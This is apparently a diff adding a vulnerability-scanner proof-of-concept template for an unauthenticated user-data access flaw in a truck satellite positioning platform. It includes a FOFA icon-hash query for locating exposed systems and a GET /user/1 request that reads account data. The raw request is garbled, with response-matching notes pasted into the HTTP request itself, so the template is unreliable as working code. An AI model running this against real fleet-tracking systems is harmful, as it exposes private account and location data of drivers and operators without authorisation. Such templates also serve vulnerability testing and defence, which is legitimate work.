@@ -1,0 +1,34 @@
+id: poc-cwbhlrh392y6wrb7
+info:
+  name: 卡车卫星定位系统越权漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cwbhlrh392y6wrb7'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cwbhlrh392y6wrb7
+    fofa: fofa:icon_hash="1553867732"
+http:
+- raw:
+  - 'GET /user/1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    account
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
